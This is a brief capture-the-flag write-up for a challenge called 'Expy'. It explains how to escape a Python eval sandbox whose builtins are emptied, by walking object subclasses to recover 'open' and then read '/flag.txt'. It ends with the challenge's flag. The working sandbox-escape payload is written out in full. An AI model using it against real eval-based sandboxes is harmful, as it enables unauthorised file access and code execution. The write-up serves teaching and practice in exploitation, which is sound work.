# Expy

### Problem 

This is an `eval` exploitation challenge. We need to read the flag file. 

### Solution

`'__builtins__': {}` prevents all the in built functions from running, including `open()`. 

However, the Python eval function is very vulnerable, so we can regain access to the builtins very easily by using this: 
```py
[
    c for c in ().__class__.__base__.__subclasses__()
    if c.__name__ == 'catch_warnings'
][0]()._module.__builtins__
```

Then the payload would simply be: 
```py
[
    c for c in ().__class__.__base__.__subclasses__()
    if c.__name__ == 'catch_warnings'
][0]()._module.__builtins__['open']('/flag.txt').read()
```


Our flag is then `CTF{eval_is_never_safe_ever}`